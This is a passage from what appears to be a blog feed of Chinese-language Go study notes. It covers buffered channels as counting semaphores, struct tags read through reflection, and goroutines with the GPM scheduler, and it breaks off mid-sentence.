(i + <span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">close</span>(jobs)</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">    <span class="keyword">for</span> j := <span class="keyword">range</span> jobs &#123;</span><br><span class="line">        wg.Add(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(j <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">            active &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">            log.Printf(<span class="string">"handle job: %d\n"</span>, j)</span><br><span class="line">            time.Sleep(<span class="number">2</span> * time.Second)</span><br><span class="line">            &lt;-active</span><br><span class="line">            wg.Done()</span><br><span class="line">        &#125;(j)</span><br><span class="line">    &#125;</span><br><span class="line">    wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行示例代码，输出如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">11</span> <span class="number">10</span>:<span class="number">03</span>:<span class="number">07</span> handle job: <span class="number">2</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">11</span> <span class="number">10</span>:<span class="number">03</span>:<span class="number">07</span> handle job: <span class="number">8</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">11</span> <span class="number">10</span>:<span class="number">03</span>:<span class="number">07</span> handle job: <span class="number">1</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">11</span> <span class="number">10</span>:<span class="number">03</span>:<span class="number">09</span> handle job: <span class="number">3</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">11</span> <span class="number">10</span>:<span class="number">03</span>:<span class="number">09</span> handle job: <span class="number">4</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">11</span> <span class="number">10</span>:<span class="number">03</span>:<span class="number">09</span> handle job: <span class="number">6</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">11</span> <span class="number">10</span>:<span class="number">03</span>:<span class="number">11</span> handle job: <span class="number">7</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">11</span> <span class="number">10</span>:<span class="number">03</span>:<span class="number">11</span> handle job: <span class="number">5</span></span><br></pre></td></tr></table></figure><p>从示例运行结果中的时间戳中，可以看到，虽然创建了很多 Goroutine，但由于计数信号量的存在，同一时间内处理活动状态（正在处理 job）的 Goroutine 的数量最多为 3 个。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>channel 是用于 goroutine 间通信的</li><li>通过预定义函数 make，可以创建两类 channel</li><li>无缓冲 channel 具备<strong>通信与同步特性</strong>，常用于作为信号通知或替代同步锁</li><li>带缓冲 channel 具备<strong>异步性</strong>，更适合用来实现基于内存的消息队列、计数信号量等</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://time.geekbang.org/column/intro/100093501" target="_blank" rel="noopener">Tony Bai · Go 语言第一课</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——结构体标签</title>
      <link href="/go-language-study-notes-struct-tag/"/>
      <url>/go-language-study-notes-struct-tag/</url>
      
        <content type="html"><![CDATA[<p>结构体标签就是对结构体字段的额外信息补充。</p><a id="more"></a><h2 id="定义结构体标签"><a href="#定义结构体标签" class="headerlink" title="定义结构体标签"></a>定义结构体标签</h2><p>结构体标签的定义方式是，在字段声明后面可以跟一个可选的字符串文字。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span> &#123;</span><br><span class="line">    f1     <span class="keyword">string</span> <span class="string">"f one"</span></span><br><span class="line">    f2     <span class="keyword">string</span></span><br><span class="line">    f3     <span class="keyword">string</span> <span class="string">`f three`</span></span><br><span class="line">    f4, f5 <span class="keyword">int64</span>  <span class="string">`f four and five`</span></span><br><span class="line">  f6     <span class="keyword">string</span> <span class="string">`key1:"value1" key1:"value2"`</span></span><br><span class="line">f7     <span class="keyword">string</span> <span class="string">"json:\"f7\""</span>   <span class="comment">// 可读性很低</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通常使用 ` 反引号来定义结构体标签，例如上面结构体 T 的 f6 字段。</p><p>为什么说是通常呢？<br>其实也可以使用双引号去定义，但是遇到需要转义时，就比较麻烦了，开发者总是需要去关心如何转义的问题，而使用反引号则完全不用担心这个问题。</p><p>因此绝大多数情况都是反引号去定义的。</p><h2 id="从结构体标签获取值"><a href="#从结构体标签获取值" class="headerlink" title="从结构体标签获取值"></a>从结构体标签获取值</h2><p>上面提到了，结构体字段只需要在字段声明后面跟上字符串就行，但是大多数情况下，不会跟一个毫无规则的字符串，因为这样没有意义。</p><p>往往会这样定义一个结构体标签：<strong>由一个或多个键值对组成。键与值使用冒号分隔，值用双引号括起来。键值对之间使用一个空格分隔</strong>，例如：<code>key1:&quot;value1&quot; key2:&quot;value2&quot;</code>。</p><p>标签可通过 reflect（反射） 包访问，因为这些信息是静态的，因此不需要实例化结构体，就能直接获取到。</p><p>结构体标签中常用的一些方法：</p><ul><li><code>Get</code>：根据 Tag 中的键获取对应的值</li><li><code>Lookup</code>：根据 Tag 中的键，查询值是否存在</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span> &#123;</span><br><span class="line">  f1     <span class="keyword">string</span> <span class="string">"f one"</span></span><br><span class="line">f2     <span class="keyword">string</span></span><br><span class="line">f3     <span class="keyword">string</span> <span class="string">`f three`</span></span><br><span class="line">f4, f5 <span class="keyword">int64</span>  <span class="string">`f four and five`</span></span><br><span class="line">f6     <span class="keyword">string</span> <span class="string">`key1: "value1" key1:"value2"`</span></span><br><span class="line">f7     <span class="keyword">string</span> <span class="string">"json:\"f7\""</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">t := reflect.TypeOf(T&#123;&#125;)</span><br><span class="line"></span><br><span class="line">f1, _ := t.FieldByName(<span class="string">"f1"</span>)</span><br><span class="line">fmt.Println(f1.Tag)           <span class="comment">// f one</span></span><br><span class="line">fmt.Println(f1.Tag.Get(<span class="string">"f1"</span>)) <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">f2, _ := t.FieldByName(<span class="string">"f2"</span>)</span><br><span class="line">fmt.Println(f2.Tag)         <span class="comment">//</span></span><br><span class="line">fmt.Println(f2.Tag.Get(<span class="string">""</span>)) <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">f3, _ := t.FieldByName(<span class="string">"f3"</span>)</span><br><span class="line">fmt.Println(f3.Tag)           <span class="comment">// f three</span></span><br><span class="line">fmt.Println(f3.Tag.Get(<span class="string">"f1"</span>)) <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">f4, _ := t.FieldByName(<span class="string">"f4"</span>)</span><br><span class="line">fmt.Println(f4.Tag)           <span class="comment">// f four and five</span></span><br><span class="line">fmt.Println(f4.Tag.Get(<span class="string">"f4"</span>)) <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">f5, _ := t.FieldByName(<span class="string">"f5"</span>)</span><br><span class="line">fmt.Println(f5.Tag)           <span class="comment">// f four and five</span></span><br><span class="line">fmt.Println(f5.Tag.Get(<span class="string">"f5"</span>)) <span class="comment">// </span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 可以看到上面部分的实例代码，通过结构体方法获取不到有效的值</span></span><br><span class="line">  <span class="comment">// 这也是为什么不会直接跟一个字符串的原因，因为结构体标签的方法在这种情况下作用体现不出来</span></span><br><span class="line"></span><br><span class="line">f6, _ := t.FieldByName(<span class="string">"f6"</span>)</span><br><span class="line">fmt.Println(f6.Tag)                <span class="comment">// key1:"value1" key1:"value2"</span></span><br><span class="line">fmt.Println(f6.Tag.Get(<span class="string">"key1"</span>))    <span class="comment">// value1</span></span><br><span class="line">fmt.Println(f6.Tag.Lookup(<span class="string">"key1"</span>)) <span class="comment">// value1 true</span></span><br><span class="line"></span><br><span class="line">f7, _ := t.FieldByName(<span class="string">"f7"</span>)</span><br><span class="line">fmt.Println(f7.Tag)                <span class="comment">// json:"f7"</span></span><br><span class="line">fmt.Println(f7.Tag.Get(<span class="string">"json"</span>))    <span class="comment">// f7</span></span><br><span class="line">fmt.Println(f7.Tag.Lookup(<span class="string">"json"</span>)) <span class="comment">// f7 true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="一个细节"><a href="#一个细节" class="headerlink" title="一个细节"></a>一个细节</h2><p>需要注意 💡 的是：编写 Tag 时，必须严格遵守键值对的规则。</p><p>结构体标签的解析代码的容错能力很差，一旦格式写错，编译和运行时都不会提示任何错误，例如下面这个例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> cat <span class="keyword">struct</span> &#123;</span><br><span class="line">Name <span class="keyword">string</span></span><br><span class="line">Type <span class="keyword">int</span> <span class="string">`json: "type" id:"100"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">typeOfCat := reflect.TypeOf(cat&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> catType, ok := typeOfCat.FieldByName(<span class="string">"Type"</span>); ok &#123;</span><br><span class="line">fmt.Println(catType.Tag.Get(<span class="string">"json"</span>))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的实例代码，一眼看上去并没有什么问题是吧？</p><p>但是实际运行并不会输出期望的 type，这是因为在结构体标签这一行，在json:和”type”之间增加了一个空格。这种写法没有遵守结构体标签的规则，因此无法通过 <code>Tag.Get</code> 获取到正确的 json 对应的值。</p><p>这个错误在开发中非常容易被疏忽，造成难以察觉的错误。</p><hr><p>结构体标签有许多应用场景，例如配置管理，结构的默认值，验证，命令行参数描述等，可以从<a href="https://github.com/golang/go/wiki/Well-known-struct-tags#list-of-well-known-struct-tags" target="_blank" rel="noopener">这个列表</a>中查看到有哪些项目使用了结构体标签。</p>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——goroutine</title>
      <link href="/go-language-study-notes-goroutine/"/>
      <url>/go-language-study-notes-goroutine/</url>
      
        <content type="html"><![CDATA[<p>并发原语（Goroutine、channel、select）是 Go 的核心，要学好 Go 并发，需要具备一些操作系统的基础知识。</p><a id="more"></a><p>所以正式学习 Goroutine 之前，先从什么是并发说起。</p><h2 id="什么是并发"><a href="#什么是并发" class="headerlink" title="什么是并发"></a>什么是并发</h2><p>并发的概念：<strong>两个或者多个事情在同一时间间隔内发生</strong>。</p><p>在单核 CPU 的时代，操作系统的基本调度和执行单元是进程（process），计算机可以“同时”运行多个程序，都是因为操作系统的并发性的存在。<br>这些程序宏观上是同时运行的，而微观上则是交替运行的。</p><p>这个时候，用户层的应用有两种设计方式：单进程和多进程，下面一一介绍。</p><h3 id="单进程"><a href="#单进程" class="headerlink" title="单进程"></a>单进程</h3><p>一个应用对应一个进程，操作系统（CPU）每次只能为一个进程进行服务。</p><p>单进程应用的情况下，用户层应用、操作系统进程以及处理器之间的关系是这样的：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221117230825.png" alt=""></p><p>可以看到，因为 CPU 只有一个，因此CPU 会轮流地为各个进程进行服务，CPU 的运行速度非常快，所以宏观上这些进程是同时运行的。</p><p>总的来说，单进程应用的设计比较简单，它的内部仅有一条代码执行流，代码从头执行到尾，不存在竞态，无需考虑同步问题。</p><h3 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h3><p>一个应用对应多个进程，操作系统（CPU）仍然每次只能为一个进程进行服务。</p><p>多进程应用的情况下，用户层应用、操作系统进程以及处理器之间的关系是这样的：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221117230844.png" alt=""></p><p>可以看到，App1 这个应用内部划分了多个模块，每一个模块内对应一个进程，每一个模块都是一个单独的代码执行流。</p><p>但是受限于单核 CPU，这些进程依旧只能并发运行，也就是轮流被单个CPU 服务。</p><p>这样看起来，多进程应用与单进程应用相比，似乎并没有什么质的提升，那为什么还要将应用设计成多进程？</p><p>这是因为，更多的是从应用的结构角度去考虑的，多进程应用将功能职责进行了划分（模块 1 对应 进程 1、模块2 对应进程 2 ），从结构上来看，要比单进程更为清晰简洁，可读性与可维护性也更好。</p><p>这种<strong>将程序分成多个可独立执行的部分的结构化程序的设计方法，就是并发设计</strong>。采用了并发设计的应用也可以看成是一组独立执行的模块的组合。</p><p>不过，进程并不适合用于承载并发设计的应用的模块执行流。因为进程是操作系统中资源拥有的基本单位，它不仅包含应用的代码和数据，还有系统级的资源，比如文件描述符、内存地址空间等等。进程的“包袱”太重，这导致它的创建、切换与撤销的代价都很大。</p><p>于是线程便诞生了。</p><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p>可以把线程理解为“轻量级进程”。</p><p>引入线程之后，<strong>线程就成了操作系统能够进行运算调度的最小单位</strong>。</p><p><strong>一个进程至少会包含一个线程</strong>，如果一个进程只包含一个线程，那么它里面的所有代码都只会被串行地执行。每个进程的第一个线程都会随着该进程的启动而被创建，它们可以被称为其所属进程的主线程。</p><p>如果一个进程中包含了多个线程，那么其中的代码就可以被并发地执行。除了进程的第一个线程之外，其他的线程都是由进程中已存在的线程创建出来的。</p><p>同时随着多核 CPU 的普及，让真正的并行成为了可能，于是主流的应用设计模型变成了这样：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221117231323.png" alt=""></p><p>可以看到，基于线程的应用通常采用的是单进程多线程的模型，一个应用对应一个进程，应用通过并发设计将自己划分为多个模块，每个模块由一个线程独立承载执行。多个线程共享这个进程所拥有的资源，此时，作为执行单元被 CPU 处理就由进程变成了线程。</p><p>线程的创建、切换与撤销的代价相对于进程是要小得多。当这个应用的多个线程同时被调度到不同的处理器核上执行时，就说这个应用是并行的。</p><p>讲到这里，可以对并发与并行两个概念做一些区分了。就像 Go 语言之父 Rob Pike 曾说过那样：<strong>并发不是并行，并发关乎结构，并行关乎执行</strong>。</p><h2 id="goroutine-基本概念"><a href="#goroutine-基本概念" class="headerlink" title="goroutine 基本概念"></a>goroutine 基本概念</h2><p>Go 并没有使用操作系统线程作为承载分解后的代码片段（模块）的基本执行单元，而是实现了goroutine 这一<strong>由 Go 运行时（runtime）负责调度的、轻量的用户级线程，为并发程序设计提供原生支持</strong>。</p><p>相比传统操作系统线程来说，goroutine 的优势主要是：</p><ul><li>资源占用小，每个 goroutine 的初始栈大小仅为 2k</li><li>由 Go 运行时而不是操作系统调度，goroutine 上下文切换在用户层完成，开销更小</li><li>在语言层面而不是通过标准库提供，goroutine 由 go 关键字创建，一退出就会被回收或者销毁，开发者无需过多关注</li><li>语言内置 channel 作为 goroutine 间通信原语，为并发设计提供了强大支持</li></ul><p>和传统编程语言不同的是，Go 语言是面向并发而生的，所以，在程序的结构设计阶段，Go 的惯例是优先考虑并发设计。这样做的目的更多是考虑随着外界环境的变化，通过并发设计的 Go 应用可以更好地、更自然地适应规模化。</p><h2 id="goroutine-调度器"><a href="#goroutine-调度器" class="headerlink" title="goroutine 调度器"></a>goroutine 调度器</h2><p>提到“调度”，首先想到的就是操作系统对进程、线程的调度。操作系统调度器会将系统中的多个线程按照一定算法调度到物理 CPU 上去运行。</p><p>传统的编程语言，比如 C、C++ 等的并发实现，多是基于线程模型的，也就是应用程序负责创建线程，操作系统负责调度线程。</p><p>但是这种传统的并发方式，有很多不足，为了解决这些问题，Go 语言中的并发实现，使用了 Goroutine，代替了操作系统的线程，也不再依靠操作系统调度。</p><p>Goroutine 调度的切换不用陷入操作系统的内核层完成，开销很低，因此一个 Go 程序可以创建成千上万个并发的 Goroutine。<br>而将这些 Goroutine 按照一定算法放到 “CPU” 上执行的程序，则被成为 Goroutine 调度器，注意，这里的“CPU” 是打引号的，并不是真正意义上的 CPU。</p><p>一个 Go 程序对于操作系统来说只是一个用户层程序，操作系统眼中只有线程，它甚至不知道有 Goroutine 的存在。所以 Goroutine 的调度全要靠 Go 自己完成。<br>那么，实现 Go 程序内 Goroutine 之间“公平”竞争“CPU”资源的任务，就落到了 Go 运行时（runtime）头上了。要知道在一个 Go 程序中，除了用户层代码，剩下的就是 Go 运行时了。</p><p>于是，Goroutine 的调度问题就演变为，Go 运行时如何将程序内的众多 Goroutine，按照一定算法调度到“CPU”资源上运行的问题了。</p><p>在操作系统层面，线程竞争的“CPU”资源是真实的物理 CPU，而 Go 程序层面，各个 Goroutine 要竞争的“CPU” 资源到底是什么？</p><p>前面说过，Go 程序是用户层程序，它本身就是整体<strong>运行在一个或者多个操作系统线程上的</strong>。所以，Goroutine 要竞争的“CPU” 资源其实就是操作系统线程。<br>因此，Goroutine 调度器的任务也就明确了，<strong>将 Goroutine 按照一定算法放到不同的操作系统线程中去执行</strong>。</p><h3 id="GPM-模型"><a href="#GPM-模型" class="headerlink" title="GPM 模型"></a>GPM 模型</h3><p>Goroutine 调度器目前使用的是 GPM 模型，它由三部分组成：</p><ul><li>G（goroutine）：Goroutine，存储了 Goroutine 的执行栈信息、Goroutine 状态以及 Goroutine 的任务函数等</li><li>P（processor）：逻辑处理器，负责从全局运行对列中获取 G（Goroutine），放到对应的本地运行队列，会绑定唯一的操作系统线程，当 G 可以运行时，会被放入逻辑处理器的执行队列</li><li>M（machine）：物理处理器，真正的执行计算资源</li></ul><p><strong>操作系统会在物理处理器上调度线程来运行，而 Go 语言的运行时会在逻辑处理器上调度 Goroutine 来运行。</strong></p><p>G、P、M 三者的调度过程如下：</p><ol><li>创建一个 Goroutine 并准备运行，这个 Goroutine 就会被放到调度器的全局运行队列中。</li><li>全局运行队列中的 Goroutine 依次出队，被调度器分配给队列的逻辑处理器 P，并放到这个逻辑处理器的本地运行队列中，本地运行队列中的 Goroutine 会一直等待，直到自己被分配的逻辑处理器执行。</li><li>Go语言运行时默认会为每个可用的物理处理器分配一个逻辑处理器，物理处理器调度线程开始执行 Goroutine。</li><li>如果正在运行的 Goroutine 需要执行一个阻塞的系统调用，比如打开一个文件，当这类调用发生时，<strong>线程和 Goroutine 会从逻辑处理器上分离</strong>，该线程会继续阻塞，等待系统调用返回。</li><li>与此同时，这个逻辑处理器就失去了用来运行的线程。所以，调度器会创建一个新的线程，并将其绑定到该逻辑处理器上。</li><li>之后，调度器会从本地运行队列里选择另外一个 Goroutine 来运行，一旦被阻塞的系统调用执行完成并返回，对应的 Goroutine 会放回到本地运行队列，而之前的线程会保存好，以便之后继续使用。</li></ol><p>下面是一个Goroutine 调度原理图，可以从全局进一步看到 G、P、M 三者之间的关系：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/Goroutine%E8%B0%83%E5%BA%A6%E5%8E%9F%E7%90%86%E5%9B%BE2.jpg" alt=""></p><h2 id="goroutine-的基本用法"><a href="#goroutine-的基本用法" class="headerlink" title="goroutine 的基本用法"></a>goroutine 的基本用法</h2><p>Go 语言通过 go 关键字 + 函数/方法的方式“创建”一个 goroutine。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上面的示例代码，可能会发现，什么都打印出来，这是怎么回事呢？</p><p>与一个进程总会有一个主线程类似，每一个独立的 Go 程序在运行时也总会有一个<strong>主 goroutine（main goroutine）</strong>。这个main goroutine 会在 Go 程序的运行准备工作完成后被自动地启用，并不需要做任何手动的操作。</p><p>每个 goroutine 一般都会携带一个函数调用，这个被调用的函数常常被称为go 函数。而main goroutine 的go函数就是那个作为程序入口的 main 函数。</p><p>这里一定要注意：<strong>go 函数真正被执行的时间，总会与其所属的 go 语句被执行的时间不同</strong>。</p><p>当程序执行到一条 go 语句时，Go 语言运行时，会先试图从某个空闲的 G 的队列中获取一个 G（也就是 goroutine），它只有在找不到空闲 G 的情况下才会去创建一个新的 G。</p><p>这也是前面的“创建”打引号的原因，因为已存在的 goroutine 总是会被优先复用。</p><p>在拿到一个空闲的 G 之后，Go 语言运行时，会用这个 G 去包装当前的那个 go 函数（或者说该函数中的那些代码），然后再把这个 G 追加到某个存放可运行的 G 的队列中。</p><p>这类队列中的 G 总是按照先入先出的顺序，被 Groutine 调度器安排运行。</p><p>因此，go 函数的执行时间总是会明显滞后于它所属的go 语句的执行时间。这里所说的“明显滞后”是对于计算机的 CPU 时钟和 Go 程序来说的。我们在大多数时候都不会有明显的感觉。</p><p>还有一个与 main goroutine 有关的特性，<strong>一旦main goroutine 退出了，那么也意味着整个应用程序的退出</strong>。</p><p>再次回到上面示例代码没有打印出结果的这个问题，这是因为<br><strong>关键字 go 并非直接执行并发操作，而是“创建”一个 goroutine（并发任务单元）。新创建的 goroutine 被放置在队列中，等待调度器安排合适系统线程去获取执行权。该过程不会阻塞，因此不会等待该任务启动，而是继续执行后边的语句，如果直至 main goroutine 退出时，还有 goroutine 未得到执行，那么它们中的代码也不会被执行了，因为整个程序也要退出了，</strong> 所以没有任何内容打印出来。</p><p>Go 语言并不会保证 goroutine 会以怎样的顺序运行，由于main goroutine 会与手动使用 go 关键字创建的 goroutine 一起接受调度，调度器可能会在 goroutine 中代码执行一部分时暂停，因此，哪个 gorotuine 先执行完，哪个后执行完，往往是不可预知的。除非使用Go 语言提供的方式进行人为干预。</p><p>下面会简单介绍一下。</p><h2 id="goroutine-执行规则"><a href="#goroutine-执行规则" class="headerlink" title="goroutine 执行规则"></a>goroutine 执行规则</h2><p>因为一旦 main goroutine 执行完成，当前 Go 程序就会结束运行，无论其他的 goroutine 是否已经在运行中，那么，有没有什么办法可以让其他的 goroutine 先执行完成之后，再让main goroutine 执行呢？</p><p>有很多办法可以做到，这里先用最简单粗暴的方式感受一下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(<span class="number">500</span> * time.Millisecond)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行示例代码，输出一下结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="comment">// 延迟 500 ms 结束程序</span></span><br></pre></td></tr></table></figure><p>其原理就是在 for 语句的后面，调用 <code>time.Sleep</code> 函数，让 main goroutine 延迟 500ms 结束。</p><p>这里延迟 500ms，足够其他的 goroutine 被调度器调度了，因此便可以看到打印结果。</p><p>这个办法虽然可行，但是 Sleep 的时间设置多久才合适呢？500ms、200ms、100ms？设置太短了，可能还没有打印就结束了，设置太长了，完全又浪费时间。</p><p>既然不好预估时间，那么能否让其他的 goroutine 在运行完成时通知一下呢？</p><p>这个思路是对的，使用Go 的 channel 就可以实现（后面的笔记会详细介绍 channel），这里有个印象就好。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"log"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">sign := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">      <span class="comment">// 将变量 i 依次发送到 channel 类型变量中</span></span><br><span class="line">sign &lt;- i</span><br><span class="line">&#125;(i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">10</span>; j++ &#123;</span><br><span class="line"><span class="comment">// 依次从channel 类型变量中取出值并打印</span></span><br><span class="line">fmt.Println(&lt;-sign)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行示例代码，输出一下结果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure><p>从输出结果可以看到，确实也能正常打印出来，而且没有“延迟”，打印完成，程序正好结束。</p><p>但是为什么这里输出的值不是顺序的呢？<br>其实这也是前面提到过的 goroutine 